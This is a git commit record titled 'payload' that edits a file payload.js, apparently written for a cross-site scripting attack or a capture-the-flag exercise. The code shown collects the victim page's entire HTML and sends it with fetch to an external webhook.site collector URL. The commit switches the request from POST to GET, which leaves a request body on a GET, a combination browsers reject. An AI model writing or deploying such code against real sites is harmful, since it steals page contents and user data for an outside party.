6f19069dbf0b5bb288cdf7fb815642d0e5a94e32
Axl <bryannicholas7@gmail.com>
2025-06-20 21:02:32 +0700

    payload

--- payload.js
+++ payload.js
@@ -2,7 +2,7 @@ async function getNotes() {
     (async () => {
     const html = document.documentElement.outerHTML;
     await fetch("https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6", {
-        method: "POST",
+        method: "GET",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ html })
     });
